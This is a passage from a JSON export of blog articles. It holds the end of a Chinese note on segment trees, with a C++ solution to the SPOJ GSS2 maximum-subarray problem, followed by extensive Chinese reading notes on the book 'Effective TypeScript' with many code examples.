for(int i=1;i<=cntq;i++) put(ans[i]);\n}\nsigned main(){\n    //ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### GSS2 - Can you answer these queries II\n\nhttps://www.luogu.com.cn/problem/SP1557\n\n**题目描述**\n\n给出 $n$ 个数，$q$ 次询问，求最大字段和，相同的数字只算一次，选出的子段可以为空，$1\\le n,q\\le 10^5$\n\n**笔记**\n\n先不考虑相同的数字只算一次如何处理\n\n先把询问离线下来，按询问区间右端点从小到大排序。然后枚举询问，不断从左到右添加数字到线段树中，直到添加的位置到达了询问的右端点。对于第 $i$ 个数字 $a_i$，我们让线段树上区间 $[1,i]$ 全加上 $a_i$，这样线段树上维护的就是从当前询问的右端点开始，往前的前缀和\n\n但是我们选出的子段不一定要包含当前询问的右端点。比如最大子段是区间 $[l,r]$，当前询问的右端点为 $R$，那么$r$ 到 $R$ 之间的数字是不应该产生贡献的，也就是之前线段树 $l$ 位置的值很大，但随着 $r$ 到 $R$ 之间的数字加入，$l$ 位置的值变小了。我们发现为了得到 $l$ 位置的最大值，可以考虑维护区间的历史最大值\n\n现在考虑相同的数字只算一次，我们只需要记录当前数字 $a_i$ 上一次的出现位置 $p$，然后让区间 $[p+1,i]$ 加上 $a_i$ 就可以了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 100005\nconst int off=100000;\nstruct Node{int add,hadd,mx,hmx;} tree[_<<2];\nint n,m,in[_],las[_<<3];\ninline void pushup(int k){nt.mx=max(lt.mx,rt.mx),nt.hmx=max(lt.hmx,rt.hmx);}\ninline void pushadd(int k,int v,int hv){\n    nt.hadd=max(nt.hadd,nt.add+hv);\n    nt.hmx=max(nt.hmx,nt.mx+hv);\n    nt.add+=v,nt.mx+=v;\n}\ninline void pushdown(int k){pushadd(ls(k),nt.add,nt.hadd);pushadd(rs(k),nt.add,nt.hadd);nt.add=nt.hadd=0;}\nvoid modify(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushadd(k,v,v),void();\n    pushdown(k);\n    int mid=(l+r)>>1;\n    if(x<=mid) modify(ls(k),l,mid,x,y,v);\n    if(y>mid) modify(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.hmx;\n    pushdown(k);\n    int mid=(l+r)>>1,res=-inf;\n    if(x<=mid) res=max(res,query(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query(rs(k),mid+1,r,x,y));\n    return res;\n}\nstruct Q{int index,l,r,ans;} q[_];\ninline void subtask(){\n    cin>>n;for(int i=1;i<=n;i++) cin>>in[i];cin>>m;\n    for(int i=1;i<=m;i++) cin>>q[i].l>>q[i].r,q[i].index=i;\n    sort(q+1,q+m+1,[](Q x,Q y){return x.r<y.r;});\n    for(int i=1,p=0;i<=m;i++){\n        while(p<q[i].r){\n            p++;\n            modify(1,1,n,las[off+in[p]]+1,p,in[p]);\n            las[off+in[p]]=p;\n        }\n        q[i].ans=query(1,1,n,q[i].l,q[i].r);\n    }\n    sort(q+1,q+m+1,[](Q x,Q y){return x.index<y.index;});\n    for(int i=1;i<=m;i++) cout<<q[i].ans<<endl;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"本文从最简单的势能线段树将其，并讲解了势能分析用于最值问题时的扩展，即吉司机线段树的各种变形与应用","key":["线段树","势能分析","势能线段树","吉司机线段树"],"tags":[],"path":["算法竞赛","知识点","势能线段树.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee9395e729c.jpg","recommend":true,"status":"published"},{"type":"Article","title":"Effective Typescript 读书笔记","id":"effective-ts","createTime":"2025-01-29T07:27:00.000Z","updateTime":"2025-09-05T13:34:05.388Z","content":"\n在最开始接触typescript的时候，很多地方感觉非常麻烦，或者不知道如何处理，直接any了事。后来在豆瓣上发现了 _Effective Typescript_ 这本书，看评价说还不错，于是就搞了本看了看，大概不到一周就看完了，感觉收获很多，非常值得推荐。这里记录一下读书笔记。\n\n本书由 62 个 item 组成，每个 item 的最后有一个 Things to remember，可以视为一个总结。\n\n## ts 和 js 的关系\n\n- ts 是 js 的超集\n\n## 配置 ts\n\n- 从 tsconfig.json 中配置 ts 而不是在命令行中\n\n- 尽可能把所有严格的检查打开，尤其是 noImplicitAny 和 strickNullChecks\n\n- 开启 noEmitOnError 来阻止没通过类型检查的代码产生编译结果\n\n- 开启 sourceMap 来使得在浏览器中 debug 时可以看到原始的 ts 代码\n\n```ts\n// tsconfig.json\n{\n \"compilerOptions\": {\n \"sourceMap\": true\n }\n}\n```\n\n## 类型\n\n### 代码的生成和类型是独立的\n\n基本的思想是，ts 中的类型仅仅是影响你在编写代码的时候，而对于代码的执行是不会有影响的，在编译后，所有与类型相关的东西都会被移除。这会有如下的影响：\n\n- 没有通过类型检查的ts代码也会产生编译后的js代码。可以在 tsconfig.json 中开启 noEmitOnError 来阻止没通过类型检查的代码产生编译结果\n- 由于在编译后，所有与类型相关的东西都会被移除，这会导致比如你定义了个 interface，然后你不能使用 instanceof 来判断一个变量的类型是不是这个 interface，因为 interface 在代码编译后会被清除\n- 你在 ts 中的类型操作并不会影响到变量的值。比如有一个 string 类型的变量 `a` ，然后你进行了这么一个操作 `const b = a as number`。虽然后面 ts 仍然会推断 `b` 为一个 number ，但实际在运行过程中， `b` 仍然是一个 string。\n- 在运行的时候的类型不一定和代码中声明的类型相同\n- ts 的类型相当于一种零成本抽象，不会使代码有任何的性能影响。\n\n### type space 和 value space\n\nts 中的标识符存在于两个地方： type space 和 value space\n\ntype space 中的东西会在运行时消失\n\ninterface 就是处于 type space 中，这就导致你不能使用 instanceof 来判断一个变量是否为某个 interface 类型\n\n字面量既可以是 type space 也可以是 value space，如：\n\n```ts\ntype T1 = \"string literal\";\ntype T2 = 123;\nconst v1 = \"string literal\";\nconst v2 = 123;\n```\n\nclass 处于这两个 space 中，既可以用作类型也可以作为一个值（这就是为什么可以使用 instanceof）\n\ntypeof 的运算符在不同的 space 中有不同的作用：\n\n```ts\ntype T1 = typeof p; // Type is Person\ntype T2 = typeof email;\n// Type is (p: Person, subject: string, body: string) => Response\nconst v1 = typeof p; // Value is \"object\"\nconst v2 = typeof email; // Value is \"function\"\n```\n\n如果我们有一个名为 `Cylinder` 的 class，则有：\n\n```ts\nconst v = typeof Cylinder; // Value is \"function\"\ntype T = typeof Cylinder; // Type is typeof Cylinder\ntype C = InstanceType<typeof Cylinder>; // Type is Cylinder\n```\n\n### 运行时类型判断\n\n如果你确实想在运行时判断类型，你可以有如下两个方式：\n\n- 判断某个特定的属性是否存在\n\n![](http://pic.caiwen.work/i/2025/01/28/679882395f50b.png)\n\n- 在 interface 上搞一个用于标记类型的属性\n\n![](http://pic.caiwen.work/i/2025/01/28/679882ec4113c.png)\n\n![](http://pic.caiwen.work/i/2025/01/28/6798831e2021a.png)\n\n- 使用 class ，然后你就可以使用 instanceof 了\n\n### 函数重载\n\n在 ts 中你不能像 java 那样搞函数重载，比如：\n\n![](http://pic.caiwen.work/i/2025/01/28/679887303634b.png)\n\n一个函数只能有一个具体的实现\n\n你需要以这样的形式实现函数重载：\n\n![](http://pic.caiwen.work/i/2025/01/28/6798877c48466.png)\n\n但还是有一些不足，如：\n\n```ts\nfunction double(x: number): number;\nfunction double(x: string): string;\nfunction double(x: any) {\n\treturn x + x;\n}\nconst num = double(12); // Type is number\nconst str = double(\"x\"); // Type is string\n```\n\n如果再搞一个函数包装一下，可能出现问题：\n\n```ts\nfunction f(x: number | string) {\n\treturn double(x);\n\t// ~ Argument of type 'string | number' is not assignable\n\t// to parameter of type 'string'\n}\n```\n\n#### conditional type\n\n更好的解决方案是使用 conditional type\n\n```ts\nfunction double<T extends number | string>(\n\tx: T,\n): T extends string ? string : number;\nfunction double(x: any) {\n\treturn x + x;\n}\n// function f(x: string | number): string | number\nfunction f(x: number | string) {\n\treturn double(x);\n}\n```\n\n### 集合角度\n\n你可以把 ts 中的类型看成集合。如果所有是 A 类型 是 B 类型 的子集，那么是 A 类型的值也是 B 类型。你可以将其与鸭子类型结合起来看\n\n### 鸭子类型\n\n```ts\ninterface Vector2D {\n\tx: number;\n\ty: number;\n}\nfunction calculateLength(v: Vector2D) {\n\treturn Math.sqrt(v.x * v.x + v.y * v.y);\n}\nconst v: NamedVector = { x: 3, y: 4, name: \"Zee\" };\ncalculateLength(v); // OK, result is 5\n```\n\n可以看到，只要满足了目标类型的特征，那么就可以视为目标类型。\n\nclass 也不例外\n\n```ts\nclass C {\n\tfoo: string;\n\tconstructor(foo: string) {\n\t\tthis.foo = foo;\n\t}\n}\nconst c = new C(\"instance of C\");\nconst d: C = { foo: \"object literal\" }; // OK!\n```\n\n你可以利用这一点进行单元测试，比如：\n\n```ts\ninterface Author {\n\tfirst: string;\n\tlast: string;\n}\nfunction getAuthors(database: PostgresDB): Author[] {\n\tconst authorRows = database.runQuery(`SELECT FIRST, LAST FROM AUTHORS`);\n\treturn authorRows.map((row) => ({ first: row[0], last: row[1] }));\n}\n```\n\n你可以把 database 的类型搞得更精确一些：\n\n```ts\ninterface DB {\n\trunQuery: (sql: string) => any[];\n}\nfunction getAuthors(database: DB): Author[] {\n\tconst authorRows = database.runQuery(`SELECT FIRST, LAST FROM AUTHORS`);\n\treturn authorRows.map((row) => ({ first: row[0], last: row[1] }));\n}\n```\n\n代码仍然和上面一样可以正常工作， 但是这回你可以自己编写一个简单的 DB 类型的一个东西，来模拟数据库，从而测试这个函数。\n\n### 规避鸭子类型\n\n类似运行时类型判断，你可以搞一个标记属性\n\n```ts\ninterface Vector2D {\n\t_brand: \"2d\";\n\tx: number;\n\ty: number;\n}\nfunction vec2D(x: number, y: number): Vector2D {\n\treturn { x, y, _brand: \"2d\" };\n}\nfunction calculateNorm(p: Vector2D) {\n\treturn Math.sqrt(p.x * p.x + p.y * p.y); // Same as before\n}\ncalculateNorm(vec2D(3, 4)); // OK, returns 5\nconst vec3D = { x: 3, y: 4, z: 1 };\ncalculateNorm(vec3D);\n// ~~~~~ Property '_brand' is missing in type...\n```\n\n对于一些基本的数据类型，比如 string ， number，这么附带一个标记属性就不太好搞了，当然你可以在创建一个 interface，但是这样就比较臃肿了，你还可以这样：\n\n```ts\ntype AbsolutePath = string & { _brand: \"abs\" };\nfunction listAbsolutePath(path: AbsolutePath) {\n\t// ...\n}\n```\n\n然后可以结合 type guard\n\n```ts\nfunction isAbsolutePath(path: string): path is AbsolutePath {\n\treturn path.startsWith(\"/\");\n}\n```\n\n或者像下面这样再搞一个函数去生成这样的类型：\n\n```ts\ntype Meters = number & { _brand: \"meters\" };\ntype Seconds = number & { _brand: \"seconds\" };\nconst meters = (m: number) => m as Meters;\nconst seconds = (s: number) => s as Seconds;\nconst oneKm = meters(1000); // Type is Meters\nconst oneMin = seconds(60); // Type is Seconds\n```\n\n不过比较尴尬的一点是，因为我们说类型的操作并不影响变量本身，因此上面这个例子中的 meters 和 seconds 仍然可以进行数值运算，但是运算后就又变成数字了\n\n```ts\nconst tenKm = oneKm * 10; // Type is number\nconst v = oneKm / oneMin; // Type is number\n```\n\n### interface 和 type 的区别\n\n两者都可以继承，interface 可以使用 extends ，type 可以使用 & 运算符，但是 interface 不可以继承一个复杂的类型，如 union 类型\n\n同时，只有 type 有 union ，interface 没有\n\n#### augmented\n\ninterface 可以 augmented ，比如：\n\n```ts\ninterface IState {\n\tname: string;\n\tcapital: string;\n}\ninterface IState {\n\tpopulation: number;\n}\nconst wyoming: IState = {\n\tname: \"Wyoming\",\n\tcapital: \"Cheyenne\",\n\tpopulation: 500_000,\n}; // OK\n```\n\n类似一种类型合并。但是 type 没有\n\n不过很多情况下，这种重复定义可能是代码写错了。因此建议使用 type 来定义类型\n\n### readonly\n\n你可以使用 readonly 来避免被改变\n\n```ts\nfunction arraySum(arr: readonly number[]) {\n\tlet sum = 0,\n\t\tnum;\n\twhile ((num = arr.pop()) !== undefined) {\n\t\t// ~~~ 'pop' does not exist on type 'readonly number[]'\n\t\tsum += num;\n\t}\n\treturn sum;\n}\n```\n\n非 readonly 类型可以赋值给 readonly类型，但 readonly 的类型不能赋值给非 readonly 类型\n\n```ts\nconst a: number[] = [1, 2, 3];\nconst b: readonly number[] = a;\nconst c: number[] = b;\n// ~ Type 'readonly number[]' is 'readonly' and cannot be\n// assigned to the mutable type 'number[]'\n```\n\n注意 readonly 的影响是 shallow 的，比如：\n\n```ts\ninterface Outer {\n\tinner: {\n\t\tx: number;\n\t};\n}\nconst o: Readonly<Outer> = { inner: { x: 0 } };\no.inner = { x: 1 };\n// ~~~~ Cannot assign to 'inner' because it is a read-only property\no.inner.x = 1; // OK\n```\n\n虽然 inner 是 readonly 但是其内部的 x 仍是可变的。你可以使用 ts-essentials 的 DeepReadonly 泛型来使深层的部分也是 readonly\n\n同时，如果给 index signature 设置 readonly ，那么可以使用解构来绕过\n\n```ts\nlet obj: { readonly [k: string]: number } = {};\n// Or Readonly<{[k: string]: number}\nobj.hi = 45;\n// ~~ Index signature in type ... only permits reading\nobj = { ...obj, hi: 12 }; // OK\nobj = { ...obj, bye: 34 }; // OK\n```\n\n### 使用 index signature 表示动态数据\n\n比如：\n\n```ts\ntype Rocket = { [property: string]: number };\n```\n\n`[property: string]: number` 就是一个 index signature\n\n- property 只是一个表示，并没有什么用\n\n- string 表示 index 的类型\n\n- number 表示取出来的值的类型\n\n实际上，js 中无论 index 是什么类型，再内部都是按 string 类型存储的，比如：\n\n> \\> **x = {}**\n>\n> {}\n>\n> \\> **x[[1, 2, 3]] = 2**\n>\n> 2\n>\n> \\> **x**\n>\n> { '1,2,3': 1 }\n>\n> \\> **{ 1: 2, 3: 4}**\n>\n> { '1': 2, '3': 4 }\n\n同时，数组也被视为对象，数组的下角标作为 key ，如：\n\n> \\> **typeof []**\n>\n> 'object'\n>\n> \\> **x = [1, 2, 3]**\n>\n> [ 1, 2, 3 ]\n>\n> \\> **x[0]**\n>\n> 1\n>\n> \\> **x['1']**\n>\n> 2\n>\n> \\> **Object.keys(x)**\n>\n> [ '0', '1', '2' ]\n\n### 枚举对象的字段\n\n朴素地遍历对象的字段可能会报错：\n\n```ts\nconst obj = {\n\tone: \"uno\",\n\ttwo: \"dos\",\n\tthree: \"tres\",\n};\nfor (const k in obj) {\n\tconst v = obj[k];\n\t// ~~~~~~ Element implicitly has an 'any' type\n\t// because type ... has no index signature\n}\n```\n\n因为这里的 k 仅仅是一个 string 类型\n\n还可以这么改进：\n\n```ts\nlet k: keyof typeof obj; // Type is \"one\" | \"two\" | \"three\"\nfor (k in obj) {\n\tconst v = obj[k]; // OK\n}\n```\n\n不过这又带来了一个问题，由于 ts 鸭子类型的特性，我们可以传递含有其他多于属性的对象。这样 ts 的推导就不准确了\n\n当然我们还可以这样：\n\n```ts\nfunction foo(abc: ABC) {\n\tfor (const [k, v] of Object.entries(abc)) {\n\t\tk; // Type is string\n\t\tv; // Type is any\n\t}\n}\n```\n\n不过这样的话还需要更多的判断去确定 v 的类型\n\n## 关于 any\n\n### 使用 any 的范围尽可能小\n\n如果你真的要用 any 的话，使用的范围尽可能小一点：\n\n比如：\n\n```ts\nfunction processBar(b: Bar) {\n\t/* ... */\n}\nfunction f() {\n\tconst x = expressionReturningFoo();\n\tprocessBar(x);\n\t// ~ Argument of type 'Foo' is not assignable to\n\t// parameter of type 'Bar'\n}\n```\n\n如果你确定 x 传给 processBar 没问题的话，你可以这么做：\n\n```ts\nprocessBar(x as any); // Prefer this\n```\n\n而不是这样：\n\n```ts\nconst x: any = expressionReturningFoo(); // Don't do this\nprocessBar(x);\n```\n\n这样可以把 any 的影响降到最低\n\n同样的，在创建 obj 的时候：\n\n```ts\nconst config: Config = {\n\ta: 1,\n\tb: 2,\n\tc: {\n\t\tkey: value,\n\t\t// ~~~ Property ... missing in type 'Bar' but required in type 'Foo'\n\t},\n};\n```\n\n这样：\n\n```ts\nconst config: Config = {\n\ta: 1,\n\tb: 2, // These properties are still checked\n\tc: {\n\t\tkey: value as any,\n\t},\n};\n```\n\n而不是：\n\n```ts\nconst config: Config = {\n\ta: 1,\n\tb: 2,\n\tc: {\n\t\tkey: value,\n\t},\n} as any; // Don't do this!\n```\n\n### 尽可能使用 any 的更精确的形式\n\n假如我们要写一个获取数组长度的函数，由于我们不知道，也没必要知道是什么类型的数组，我们可以这样：\n\n```ts\nfunction getLength(array: any[]) {\n\treturn array.length;\n}\n```\n\n而不是：\n\n```ts\nfunction getLengthBad(array: any) {\n\t// Don't do this!\n\treturn array.length;\n}\n```\n\n又比如这样：\n\n```ts\nfunction hasTwelveLetterKey(o: { [key: string]: any }) {\n\tfor (const key in o) {\n\t\tif (key.length === 12) {\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n```\n\n而不是直接把 o 类型设为 any\n\n#### 任意个参数的函数\n\n```ts\nconst numArgsBad = (...args: any) => args.length; // Returns any\nconst numArgsGood = (...args: any[]) => args.length; // Returns number\n```\n\n要像上面这样而不是下面这样\n\n### 把一些不太安全的类型断言隐藏在函数中\n\n比如我们要实现一个函数，可以做到缓存函数最后一次的返回结果：\n\n下面是一个实现：\n\n```ts\nfunction cacheLast<T extends Function>(fn: T): T {\n\tlet lastArgs: any[] | null = null;\n\tlet lastResult: any;\n\treturn function (...args: any[]) {\n\t\t// ~~~~~~~~~~~~~~~~~~~~~~~~~~\n\t\t// Type '(...args: any[]) => any' is not assignable to type 'T'\n\t\tif (!lastArgs || !shallowEqual(lastArgs, args)) {\n\t\t\tlastResult = fn(...args);\n\t\t\tlastArgs = args;\n\t\t}\n\t\treturn lastResult;\n\t};\n}\n```\n\n根据我们的代码实现，最后的返回值一定是可以与 T 类型匹配的，但是 ts 仍报错，虽然我们可以写出没报错的形式，但可能有点麻烦。我们知道这里一定是没问题的，所以可以进行类型断言：\n\n```ts\nfunction cacheLast<T extends Function>(fn: T): T {\n\tlet lastArgs: any[] | null = null;\n\tlet lastResult: any;\n\treturn function (...args: any[]) {\n\t\t// ~~~~~~~~~~~~~~~~~~~~~~~~~~\n\t\t// Type '(...args: any[]) => any' is not assignable to type 'T'\n\t\tif (!lastArgs || !shallowEqual(lastArgs, args)) {\n\t\t\tlastResult = fn(...args);\n\t\t\tlastArgs = args;\n\t\t}\n\t\treturn lastResult;\n\t} as unknown as T;\n}\n```\n\n我们出于一些原因，不得已使用了 any 和一些类型断言，但这仅仅发生在这个函数体中，我们把这些限定了一个范围。我们只要确保函数的签名部分并没有什么 any 之类的泄露出来就好了\n\n### 考虑使用 unknown 和 never\n\nany 有如下的特性：\n\n- 任何类型都可以赋值给 any 类型\n- any 类型可以赋值给其他任意的类型\n\nunknown 只满足第一条，即任何类型都可以赋值给 unknown 类型。但不满足第二条，即只能赋值给其他的 unknown 和 any 类型\n\nnever 只满足第二条，即可以赋值给其他任意的类型。但不满足第一条，即任何类型都不能赋值给 never （包括 any）\n\n比如现在要做一个 yaml 的解析函数，我们自然是无法知道解析出来的类型是什么，我们可能考虑使用 any 作为其返回值，但还是不够 type safety。更好的做法是将返回值设置为 unknown，这样的话，任何的值都可以作为返回值给出去，但是调用者接收到返回值后无法使用，必须使用类型断言，转为自己期望的类型，从而保证了类型安全。\n\n当然有人可能想用泛型来包装一下，比如：\n\n```cpp\nfunction safeParseYAML<T>(yaml: string): T {\n return parseYAML(yaml);\n}\n```\n\n但这在 ts 中并不是一个好的代码风格\n\n#### 双重断言\n\nunknown 还可以用来双重断言：\n\n```ts\nlet barUnk = foo as unknown as Bar;\n```\n\n这样的话，即使后面我们进行代码重构，两次断言被分开了，也会报错，不会出现什么大问题。但是如果是先转成 any 在转成 Bar 的话就没有了这个效果\n\n#### object 和 {}\n\n这两个具有和 unknown 类似的特性，但是比 unknown 表示的范围更加小一点\n\n- object 包括所有的 对象 和 数组，但是不包括一些 primitive type ，比如 `true` `12` `\"foo\"`\n- {} 包括所有的值，除了 null 和 undefined\n\n### 检查项目的类型覆盖率\n\n使用 `npx type-coverage` 可以看到项目的类型覆盖率。使用 any 会使这个值下降。\n\n使用 `npx type-coverage --detail` 可以看到项目中哪里使用了 any\n\n## 类型推导\n\n### Excess property checking\n\nExcess property checking 可以检查你在书写一个特定类型的 obj 的时候是否引入了多余的属性。在声明变量的时候添加显式的类型标注可以开启这个检查：\n\n```ts\ninterface Room {\n\tnumDoors: number;\n\tceilingHeightFt: number;\n}\nconst r: Room = {\n\tnumDoors: 1,\n\tceilingHeightFt: 10,\n\telephant: \"present\",\n\t// ~~~~~~~~~~~~~~~~~~ Object literal may only specify known properties,\n\t// and 'elephant' does not exist in type 'Room'\n};\n```\n\n这也是为什么我们在这种情况下要用类型标注而不是类型断言。\n\n作为函数的参数传递时，也有这个检查：\n\n```ts\ninterface Options {\n\ttitle: string;\n\tdarkMode?: boolean;\n}\nfunction createWindow(options: Options) {\n\tif (options.darkMode) {\n\t\tsetDarkMode();\n\t}\n\t// ...\n}\ncreateWindow({\n\ttitle: \"Spider Solitaire\",\n\tdarkmode: true,\n\t// ~~~~~~~~~~~~~ Object literal may only specify known properties, but\n\t// 'darkmode' does not exist in type 'Options'.\n\t// Did you mean to write 'darkMode'?\n});\n```\n\n但是注意只有字面量可以\n\n```ts\nconst o: Options = { darkmode: true, title: \"Ski Free\" };\n// ~~~~~~~~ 'darkmode' does not exist in type 'Options'...\nconst o1: Options = document; // OK\nconst o2: Options = new HTMLAnchorElement(); // OK\n\nconst intermediate = { darkmode: true, title: \"Ski Free\" };\nconst o: Options = intermediate; // OK\n```\n\n如果你使用了字面量，也开启了类型标注，但是还使用了类型断言，这个检查也不会开启\n\n你可以添加一个 index signature 来禁用这个检查：\n\n```ts\ninterface Options {\n\tdarkMode?: boolean;\n\t[otherOptions: string]: unknown;\n}\nconst o: Options = { darkmode: true }; // OK\n```\n\n如果一个 interface 的所有属性都可以为空，那么就称其为弱类型：\n\n```ts\ninterface LineChartOptions {\n\tlogscale?: boolean;\n\tinvertedYAxis?: boolean;\n\tareaChart?: boolean;\n}\n```\n\n根据 ts 鸭子类型的特性，任何的 obj 都可以称为 LineChartOptions 类型，但是 ts 又引入了另一个检查，一个 obj 必须与弱类型至少有一个属性相同才可以赋值：\n\n```ts\nconst opts = { logScale: true };\nconst o: LineChartOptions = opts; //error\n```\n\n### 推导尺度\n\nconst 声明的变量的推导比 let 的更加精确，如：\n\n```ts\nlet x = \"x\"; // type is string\nconst x = \"x\"; // type is \"x\"\n```\n\n但 const 声明的对象内的属性没有这个：\n\n```ts\nconst v = {\n\tx: 1, // type is number\n};\nv.x = 3; // OK\n```\n\n有时你想让推导变得更加精确，你可以手动标注类型：\n\n```ts\nconst v: { x: 1 | 3 | 5 } = {\n\tx: 1,\n}; // Type is { x: 1 | 3 | 5; }\n```\n\n或者使用 as const\n\n```ts\nconst v1 = {\n\tx: 1,\n\ty: 2,\n}; // Type is { x: number; y: number; }\nconst v2 = {\n\tx: 1 as const,\n\ty: 2,\n}; // Type is { x: 1; y: number; }\nconst v3 = {\n\tx: 1,\n\ty: 2,\n} as const; // Type is { readonly x: 1; readonly y: 2; }\nconst a1 = [1, 2, 3]; // Type is number[]\nconst a2 = [1, 2, 3] as const; // Type is readonly [1, 2, 3]\n```\n\n数组和 tuple 类型也有类似的问题，如：\n\n```ts\n// Parameter is a (latitude, longitude) pair.\nfunction panTo(where: [number, number]) {\n\t/* ... */\n}\npanTo([10, 20]); // OK\nconst loc = [10, 20];\npanTo(loc);\n// ~~~ Argument of type 'number[]' is not assignable to\n// parameter of type '[number, number]'\n```\n\n你可以这么做：\n\n```ts\nconst loc: [number, number] = [10, 20];\npanTo(loc); // OK\n```\n\n使用 as const 可能出问题：\n\n```ts\nconst loc = [10, 20] as const;\npanTo(loc);\n// ~~~ Type 'readonly [10, 20]' is 'readonly'\n// and cannot be assigned to the mutable type '[number, number]'\n```\n\n### type guard\n\n你可以手动编写一个函数，来判断一个值是否是某个类型，帮助 ts 更好地推导\n\n```ts\nfunction isInputElement(el: HTMLElement): el is HTMLInputElement {\n\treturn \"value\" in el;\n}\nfunction getElementContent(el: HTMLElement) {\n\tif (isInputElement(el)) {\n\t\tel; // Type is HTMLInputElement\n\t\treturn el.value;\n\t}\n\tel; // Type is HTMLElement\n\treturn el.textContent;\n}\n```\n\n### 理解 any 类型的\"进化\"\n\n有的变量，可能你在往里面存放具体的值之前，ts 将其为推断为 any 类型，但是存放具体的值之后，ts 将其推断为更加具体的类型，比如：\n\n```ts\nfunction range(start: number, limit: number) {\n\tconst out = []; // Type is any[]\n\tfor (let i = start; i < limit; i++) {\n\t\tout.push(i); // Type of out is any[]\n\t}\n\treturn out; // Type is number[]\n}\n```\n\n和上面那一条不一样，这种 \"进化\" 是可以 \"膨胀\" 的：\n\n```ts\nconst result = []; // Type is any[]\nresult.push(\"a\");\nresult; // Type is string[]\nresult.push(1);\nresult; // Type is (string | number)[]\n```\n\n除了循环结构，分支结构和 try-catch 结构也可以有这种特性：\n\n```ts\nlet val; // Type is any\nif (Math.random() < 0.5) {\n\tval = /hello/;\n\tval; // Type is RegExp\n} else {\n\tval = 12;\n\tval; // Type is number\n}\nval; // Type is number | RegExp\n```\n\n```ts\nlet val = null; // Type is any\ntry {\n\tsomethingDangerous();\n\tval = 12;\n\tval; // Type is number\n} catch (e) {\n\tconsole.warn(\"alas!\");\n}\nval; // Type is number | null\n```\n\n但是在函数闭包里没有这种特性：\n\n```ts\nfunction makeSquares(start: number, limit: number) {\n\tconst out = [];\n\t// ~~~ Variable 'out' implicitly has type 'any[]' in some locations\n\trange(start, limit).forEach((i) => {\n\t\tout.push(i * i);\n\t});\n\treturn out;\n\t// ~~~ Variable 'out' implicitly has an 'any[]' type\n}\n```\n\n当然，在\"进化\"之前，他还是 any，比如：\n\n```ts\nconst out = [];\n // ~~~ Variable 'out' implicitly has type 'any[]' in some\n // locations where its type cannot be determined\n if (start === limit) {\n     return out;\n     // ~~~ Variable 'out' implicitly has an 'any[]' type\n }\n for (let i = start; i < limit; i++) {\n \tout.push(i);\n }\n return out;\n}\n```\n\n不过还是建议使用显式的类型标注，以便更好地代码补全的错误检查\n\n### aliase 的推导\n\nts 无法很好地推导 aliase\n\n```ts\nfunction isPointInPolygon(polygon: Polygon, pt: Coordinate) {\n\tconst box = polygon.bbox;\n\tif (polygon.bbox) {\n\t\tif (\n\t\t\tpt.x < box.x[0] ||\n\t\t\tpt.x > box.x[1] ||\n\t\t\t// ~~~ ~~~ Object is possibly 'undefined'\n\t\t\tpt.y < box.y[1] ||\n\t\t\tpt.y > box.y[1]\n\t\t) {\n\t\t\t// ~~~ ~~~ Object is possibly 'undefined'\n\t\t\treturn false;\n\t\t}\n\t}\n\t// ...\n}\n```\n\n因此一直使用一个 aliase\n\n```ts\nfunction isPointInPolygon(polygon: Polygon, pt: Coordinate) {\n\tconst box = polygon.bbox;\n\tif (box) {\n\t\tif (\n\t\t\tpt.x < box.x[0] ||\n\t\t\tpt.x > box.x[1] ||\n\t\t\tpt.y < box.y[1] ||\n\t\t\tpt.y > box.y[1]\n\t\t) {\n\t\t\t// OK\n\t\t\treturn false;\n\t\t}\n\t}\n\t// ...\n}\n```\n\n### async 函数返回值推导\n\nts 推导 async 函数返回值时，会自动将类型用 Promise 泛型包裹：\n\n```ts\n// function getNumber(): Promise<number>\nasync function getNumber() {\n\treturn 42;\n}\n```\n\n### 对于 dom 的类型推导\n\nts 可以推断 dom 的类型：\n\n```ts\ndocument.getElementsByTagName(\"p\")[0]; // HTMLParagraphElement\ndocument.createElement(\"button\"); // HTMLButtonElement\ndocument.querySelector(\"div\"); // HTMLDivElement\n```\n\n但是这种就不灵了：\n\n```ts\ndocument.getElementById(\"my-div\"); // HTMLElement\n```\n\n## 代码建议\n\n### 不要使用 Object wrapper types\n\n比如 String、Number、Boolean、Symbol、Bigint 这种类型\n\n这种类型相当于对象，直接比较，即使是用 === ，比较的也是对象的地址，地址不同的对象即使看起来完全一致也会判定为 false\n\n> \\> **\"hello\" === new String(\"hello\")**\n>\n> false\n>\n> \\> **new String(\"hello\") === new String(\"hello\")**\n>\n> false\n\n对于 primitive type ，当需要将其视为其所对应的 object wrapper type 的时候，则会创建一个临时的对象，然后在操作结束后将对象销毁，如：\n\n> \\> **x = \"hello\"**\n>\n> \\> **x.language = 'English'**\n>\n> 'English'\n>\n> \\> **x.language**\n>\n> undefined\n\n此外，primitive type 和 object wrapper type 在 ts 中视为不同的类型。primitive type 可以赋值为 object wrapper type ，而反之则不可以。但注意前者，即使你可以赋值，但是在运行时，他的值仍然为 primitive type，这会导致一些疑惑的地方。\n\n```ts\nfunction getStringLen(foo: String) {\n\treturn foo.length;\n}\ngetStringLen(\"hello\"); // OK\ngetStringLen(new String(\"hello\")); // OK\n\nfunction isGreeting(phrase: String) {\n\treturn [\"hello\", \"good day\"].includes(phrase);\n\t// ~~~~~~\n\t// Argument of type 'String' is not assignable to parameter\n\t// of type 'string'.\n\t// 'string' is a primitive, but 'String' is a wrapper object;\n\t// prefer using 'string' when possible\n}\n```\n\n所以还是一律使用 primitive type 比较好\n\n### 不同类型的变量使用不同的名称\n\n在 js 中可以给一个变量先后赋值不同类型的值，但在 ts 中不可以。你可能考虑这么做：\n\n```ts\nlet id: string | number = 